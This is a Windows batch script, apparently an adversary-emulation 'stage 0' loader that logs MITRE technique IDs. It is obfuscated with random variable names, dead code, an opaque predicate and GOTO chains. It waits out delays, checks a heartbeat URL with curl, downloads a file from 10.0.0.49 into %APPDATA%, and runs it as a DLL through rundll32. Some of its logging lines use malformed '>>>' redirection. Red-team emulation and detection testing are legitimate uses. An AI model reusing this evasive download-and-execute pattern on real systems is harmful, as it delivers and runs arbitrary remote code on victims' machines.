@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments with random variable names
SET yktnwwf=%APPDATA%\8095\02e0cf87
SET fpakbq=Macula-Stage0-8095
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?8095-7
SET omxgazu=BALAM-S2BO
SET yydue=7
SET edjwtl=expressvp.txt
SET fpldhe=8095

REM Additional random variables for computed values
SET zxmqp=system32
SET vbnkj=windows
SET qwert=temp
SET asdfg=localappdata
SET poiuy=nul
SET lkjhg=cmd
SET mnbvc=curl
SET cxzqw=rundll32

REM Log file path
SET plmokn=%APPDATA%\!yydue!\macula-simulations.log

REM State machine initialization
SET sstate=0
GOTO dispatch_xyzab

REM Dead code block 1 - never executed
:dead_ghijk
ECHO This is never displayed >nul
SET fakevar=unused_value
GOTO END

REM Real code: dispatch state machine
:dispatch_xyzab
IF !sstate!==0 GOTO state_mnbvc
IF !sstate!==17 GOTO state_qwerty
IF !sstate!==42 GOTO state_asdfgh
IF !sstate!==99 GOTO state_endnow
GOTO END

REM Initial delay and setup
:state_mnbvc
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Initial delay start=30s >>> "!plmokn!" 2>nul
timeout /t 30 /nobreak >nul
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Initial delay complete >>> "!plmokn!" 2>nul

SET sstate=17
GOTO dispatch_xyzab

REM Dead code block 2
:dead_poiuy
REM This code never runs
FOR /L %%i IN (1,1,10) DO (
    ECHO Junk %%i >nul
)
GOTO END

REM Heartbeat check
:state_qwerty
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Heartbeat check start=!rdzgrnne! >>> "!plmokn!" 2>nul

REM Opaque predicate (always true)
IF 1==1 (
    SET nextstate=download_phase
) ELSE (
    SET nextstate=dead_poiuy
)

REM Random delay before heartbeat
SET /A rdelay=!RANDOM! %% 15 + 5
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Random delay start=!rdelay!s >>> "!plmokn!" 2>nul
ping -n !rdelay! 127.0.0.1 >nul

!mnbvc! -k -s -o !poiuy! "!rdzgrnne!"
IF !ERRORLEVEL!==0 (
    SET ttpresult=1
    SET errdetail=
) ELSE (
    SET ttpresult=0
    SET errdetail=connection_failed
)

REM TTP logging for T1218 detection (heartbeat)
SET dtstamp=!DATE:/=-!
SET dtstamp=!dtstamp: =!
SET tmstamp=!TIME:.=!
SET tmstamp=!tmstamp::=!
ECHO [!dtstamp! !tmstamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpresult!:!errdetail! >> "!plmokn!" 2>nul

ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Heartbeat check complete result=!ttpresult! >>> "!plmokn!" 2>nul

SET sstate=42
GOTO dispatch_xyzab

REM Dead code block 3
:junk_vcxxz
REM More unused code
SET fake1=value1
SET fake2=value2
GOTO END

REM Download and execution phase
:state_asdfgh
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Directory change start=!yktnwwf! >>> "!plmokn!" 2>nul

REM Intermediate jump
SET jumpvar=substate_one
GOTO !jumpvar!

:substate_one
IF NOT EXIST "!yktnwwf!" (
    MKDIR "!yktnwwf!" 2>nul
)
CD /D "!yktnwwf!" 2>nul
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Directory change complete >>> "!plmokn!" 2>nul

REM Delay between operations
CHOICE /C Y /N /D Y /T 10 >nul

ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Download start=!repbmqg! >>> "!plmokn!" 2>nul
!mnbvc! -k -s -o "!edjwtl!" "!repbmqg!"
IF !ERRORLEVEL!==0 (
    SET ttpresult2=1
    SET errdetail2=
) ELSE (
    SET ttpresult2=0
    SET errdetail2=download_failed
)

REM TTP logging for T1105 (Ingress Tool Transfer)
SET dtstamp2=!DATE:/=-!
SET dtstamp2=!dtstamp2: =!
SET tmstamp2=!TIME:.=!
SET tmstamp2=!tmstamp2::=!
ECHO [!dtstamp2! !tmstamp2!][!omxgazu!]: !yydue!-!fpldhe!-T1105|Ingress Tool Transfer=!ttpresult2!:!errdetail2! >> "!plmokn!" 2>nul

ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Download complete result=!ttpresult2! >>> "!plmokn!" 2>nul

timeout /t 8 /nobreak >nul

REM Nested GOTO chain for execution
GOTO exec_chain1

:exec_chain1
GOTO exec_chain2

:exec_chain2
IF EXIST "!edjwtl!" (
    GOTO exec_final
) ELSE (
    GOTO END
)

:exec_final
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: DLL execution start >>> "!plmokn!" 2>nul

REM Use full path for rundll32
C:\!vbnkj!\!zxmqp!\!cxzqw!.exe "!edjwtl!",DllMain
SET execresult=!ERRORLEVEL!

IF !execresult!==0 (
    SET ttpresult3=1
    SET errdetail3=
) ELSE (
    SET ttpresult3=0
    SET errdetail3=load_failed
)

REM TTP logging for T1218 execution
SET dtstamp3=!DATE:/=-!
SET dtstamp3=!dtstamp3: =!
SET tmstamp3=!TIME:.=!
SET tmstamp3=!tmstamp3::=!
ECHO [!dtstamp3! !tmstamp3!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpresult3!:!errdetail3! >> "!plmokn!" 2>nul

ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: DLL execution complete result=!ttpresult3! >>> "!plmokn!" 2>nul

SET sstate=99
GOTO dispatch_xyzab

REM Dead code block 4
:fake_cleanup
REM This cleanup never runs
DEL "!edjwtl!" /Q 2>nul
GOTO END

REM Final delay and exit
:state_endnow
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Final delay start=15s >>> "!plmokn!" 2>nul
ping -n 15 127.0.0.1 >nul
ECHO [%DATE% %TIME%][DEBUG][!omxgazu!]: Script complete >>> "!plmokn!" 2>nul

:END
ENDLOCAL